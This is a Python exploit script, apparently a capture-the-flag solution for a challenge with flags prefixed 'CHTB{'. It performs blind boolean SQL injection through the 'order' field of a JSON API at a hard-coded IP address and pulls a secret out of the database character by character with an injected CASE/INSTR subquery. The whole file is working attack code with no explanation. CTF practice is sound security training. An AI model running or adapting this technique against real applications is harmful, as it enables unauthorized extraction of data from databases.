import requests
import string

flag = "CHTB{"
url = "http://138.68.151.248:31892/api/list"

restart = True

while restart:
    restart = False

    for i in string.ascii_letters + string.digits + "!@#$*.&+^()@_{}":
        payload = flag + i
        post_data = {'order': '(select case when (select count(flag) from flag_e6ed09eb02 where instr(flag, \"' + payload + '\")) then id else count end)'}
        r = requests.post(url, json=post_data, allow_redirects=False)

        if r.json()[0]['id'] == 1:
            print(payload)
            restart = True
            flag = payload

            if i == "}":
                print("\nFlag: " + flag)

                exit(0)
            break